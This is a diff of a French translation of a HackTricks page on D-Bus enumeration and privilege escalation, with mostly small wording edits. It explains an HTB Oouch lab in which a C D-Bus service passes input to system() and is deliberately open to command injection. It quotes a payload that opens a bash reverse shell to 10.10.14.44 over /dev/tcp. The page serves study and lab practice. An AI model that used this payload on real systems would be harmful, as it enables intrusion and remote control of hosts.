@@ -9,8 +9,8 @@ Autres façons de soutenir HackTricks :
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
@@ -18,7 +18,7 @@ Autres façons de soutenir HackTricks :
 
 D-Bus est utilisé comme médiateur de communications inter-processus (IPC) dans les environnements de bureau Ubuntu. Sur Ubuntu, on observe le fonctionnement simultané de plusieurs bus de messages : le bus système, principalement utilisé par les **services privilégiés pour exposer des services pertinents dans tout le système**, et un bus de session pour chaque utilisateur connecté, exposant des services pertinents uniquement pour cet utilisateur spécifique. L'accent est principalement mis sur le bus système en raison de son association avec les services s'exécutant avec des privilèges plus élevés (par exemple, root), notre objectif étant d'élever les privilèges. Il est à noter que l'architecture de D-Bus utilise un 'routeur' par bus de session, qui est responsable de rediriger les messages des clients vers les services appropriés en fonction de l'adresse spécifiée par les clients pour le service avec lequel ils souhaitent communiquer.
 
-Les services sur D-Bus sont définis par les **objets** et les **interfaces** qu'ils exposent. Les objets peuvent être comparés à des instances de classe dans les langages de programmation orientée objet standard, chaque instance étant identifiée de manière unique par un **chemin d'objet**. Ce chemin, similaire à un chemin de système de fichiers, identifie de manière unique chaque objet exposé par le service. Une interface clé à des fins de recherche est l'interface **org.freedesktop.DBus.Introspectable**, comprenant une méthode unique, Introspect. Cette méthode renvoie une représentation XML des méthodes prises en charge par l'objet, des signaux et des propriétés, avec un accent ici sur les méthodes en omettant les propriétés et les signaux.
+Les services sur D-Bus sont définis par les **objets** et les **interfaces** qu'ils exposent. Les objets peuvent être comparés à des instances de classe dans les langages de programmation orientée objet standard, chaque instance étant identifiée de manière unique par un **chemin d'objet**. Ce chemin, similaire à un chemin de système de fichiers, identifie de manière unique chaque objet exposé par le service. Une interface clé à des fins de recherche est l'interface **org.freedesktop.DBus.Introspectable**, comportant une méthode unique, Introspect. Cette méthode renvoie une représentation XML des méthodes prises en charge par l'objet, des signaux et des propriétés, l'accent étant mis ici sur les méthodes en omettant les propriétés et les signaux.
 
 Pour la communication avec l'interface D-Bus, deux outils ont été utilisés : un outil en ligne de commande nommé **gdbus** pour l'invocation facile des méthodes exposées par D-Bus dans des scripts, et [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), un outil GUI basé sur Python conçu pour énumérer les services disponibles sur chaque bus et afficher les objets contenus dans chaque service.
 ```bash
@@ -37,7 +37,7 @@ Une caractéristique notable est l'affichage de l'**identifiant de processus (pi
 
 Cependant, notez que **certaines méthodes nécessitent une authentification** avant de nous permettre de les invoquer. Nous ignorerons ces méthodes, car notre objectif est d'élever nos privilèges sans identifiants en premier lieu.
 
-Notez également que certains des services interrogent un autre service D-Bus nommé org.freedeskto.PolicyKit1 pour savoir si un utilisateur doit être autorisé à effectuer certaines actions ou non.
+Notez également que certains des services interrogent un autre service D-Bus nommé org.freedeskto.PolicyKit1 pour savoir si un utilisateur devrait être autorisé à effectuer certaines actions ou non.
 
 ## **Énumération de la ligne de commande**
 
@@ -69,9 +69,11 @@ org.freedesktop.locale1                  - -               -                (act
 ```
 #### Connexions
 
-[D'après Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Lorsqu'un processus établit une connexion à un bus, le bus attribue à la connexion un nom de bus spécial appelé _nom de connexion unique_. Les noms de bus de ce type sont immuables - il est garanti qu'ils ne changeront pas tant que la connexion existe - et, plus important encore, ils ne peuvent pas être réutilisés pendant la durée de vie du bus. Cela signifie qu'aucune autre connexion à ce bus n'aura jamais un tel nom de connexion unique attribué, même si le même processus ferme la connexion au bus et en crée une nouvelle. Les noms de connexion uniques sont facilement reconnaissables car ils commencent par le caractère deux-points - sinon interdit. 
+[De Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Lorsqu'un processus établit une connexion à un bus, le bus attribue à la connexion un nom de bus spécial appelé _nom de connexion unique_. Les noms de bus de ce type sont immuables - il est garanti qu'ils ne changeront pas tant que la connexion existe - et, plus important encore, ils ne peuvent pas être réutilisés pendant la durée de vie du bus. Cela signifie qu'aucune autre connexion à ce bus n'aura jamais attribué un tel nom de connexion unique, même si le même processus ferme la connexion au bus et en crée une nouvelle. Les noms de connexion uniques sont facilement reconnaissables car ils commencent par le caractère deux-points - sinon interdit. 
 
 ### Informations sur l'objet de service
+
+Ensuite, vous pouvez obtenir des informations sur l'interface avec :
 ```bash
 busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface
 
@@ -260,11 +262,11 @@ return render_template('hacker.html', title='Hacker')
 Comme vous pouvez le voir, il se **connecte à une interface D-Bus** et envoie à la fonction **"Block"** l'adresse "client\_ip".
 
 De l'autre côté de la connexion D-Bus, un binaire compilé en C s'exécute. Ce code **écoute** la connexion D-Bus **pour l'adresse IP et appelle iptables via la fonction `system`** pour bloquer l'adresse IP fournie.\
-**L'appel à `system` est intentionnellement vulnérable à l'injection de commandes**, donc une charge utile comme celle-ci créera un shell inversé : `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+**L'appel à `system` est délibérément vulnérable à l'injection de commandes**, donc une charge utile comme celle-ci créera un shell inversé : `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
 ### Exploitez-le
 
-À la fin de cette page, vous pouvez trouver le **code C complet de l'application D-Bus**. À l'intérieur, entre les lignes 91-97, vous pouvez voir comment le `chemin de l'objet D-Bus` et le `nom de l'interface` sont **enregistrés**. Ces informations seront nécessaires pour envoyer des informations à la connexion D-Bus :
+À la fin de cette page, vous pouvez trouver le **code C complet de l'application D-Bus**. À l'intérieur, entre les lignes 91-97, vous pouvez voir comment le **`chemin de l'objet D-Bus`** et le **`nom de l'interface`** sont **enregistrés**. Ces informations seront nécessaires pour envoyer des informations à la connexion D-Bus :
 ```c
 /* Install the object */
 r = sd_bus_add_object_vtable(bus,
@@ -274,7 +276,7 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-Aussi, à la ligne 57, vous pouvez trouver que **la seule méthode enregistrée** pour cette communication D-Bus est appelée `Block`(_**C'est pourquoi dans la section suivante, les charges utiles vont être envoyées à l'objet de service `htb.oouch.Block`, à l'interface `/htb/oouch/Block` et au nom de méthode `Block`**_):
+Aussi, à la ligne 57, vous pouvez trouver que **la seule méthode enregistrée** pour cette communication D-Bus est appelée `Block` (_**C'est pourquoi dans la section suivante, les charges utiles vont être envoyées à l'objet de service `htb.oouch.Block`, à l'interface `/htb/oouch/Block` et au nom de méthode `Block`**_):
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
@@ -299,7 +301,7 @@ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oou
 * Le tag "-system" est utilisé pour indiquer qu'il s'agit d'un message système, et non d'un message de session (par défaut).
 * Le tag "--print-reply" est utilisé pour imprimer notre message de manière appropriée et recevoir toutes les réponses dans un format lisible par l'homme.
 * "--dest=Dbus-Interface-Block" L'adresse de l'interface Dbus.
-* "--string:" - Type de message que nous voulons envoyer à l'interface. Il existe plusieurs formats d'envoi de messages comme double, bytes, booleans, int, objpath. Parmi ceux-ci, le "chemin d'objet" est utile lorsque nous voulons envoyer un chemin d'accès à un fichier à l'interface Dbus. Nous pouvons utiliser un fichier spécial (FIFO) dans ce cas pour transmettre une commande à l'interface au nom d'un fichier. "string:;" - Cela sert à appeler à nouveau le chemin d'objet où nous plaçons le fichier/commande de shell inversé FIFO.
+* "--string:" - Type de message que nous voulons envoyer à l'interface. Il existe plusieurs formats d'envoi de messages tels que double, bytes, booleans, int, objpath. Parmi ceux-ci, le "chemin d'objet" est utile lorsque nous voulons envoyer un chemin d'accès à un fichier à l'interface Dbus. Nous pouvons utiliser un fichier spécial (FIFO) dans ce cas pour transmettre une commande à l'interface au nom d'un fichier. "string:;" - Cela sert à appeler à nouveau le chemin d'objet où nous plaçons le fichier de shell inversé FIFO/commande.
 
 _Notez que dans `htb.oouch.Block.Block`, la première partie (`htb.oouch.Block`) fait référence à l'objet de service et la dernière partie (`.Block`) fait référence au nom de la méthode._
 
@@ -448,7 +450,7 @@ return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 ```
 {% endcode %}
 
-# Références
+## Références
 * [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
 <details>
@@ -460,7 +462,7 @@ Autres façons de soutenir HackTricks:
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
